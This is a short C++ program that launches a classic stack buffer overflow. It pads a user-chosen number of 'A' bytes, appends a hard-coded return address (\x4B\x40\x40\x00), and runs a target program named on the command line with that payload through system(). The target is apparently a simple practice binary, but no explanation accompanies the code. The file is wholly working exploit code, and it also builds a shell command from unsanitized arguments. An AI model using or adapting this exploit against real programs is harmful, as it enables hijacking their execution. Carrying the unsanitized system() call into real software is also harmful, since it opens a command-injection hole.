#include <string>
#include <sstream>
#include <cstdlib>
using namespace std;

int main(int argc, char **argv)
{
    stringstream ss;
    int overSize;
    ss << argv[2];
    ss >> overSize;

    string simplec001(argv[1]);
    string buffer_overflow(overSize, 'A');
    buffer_overflow += "\x4B\x40\x40\x00";
    ostringstream sout;
    sout << '\"' << simplec001 << "\" " << buffer_overflow;
    system(sout.str().c_str());
    system("pause");
}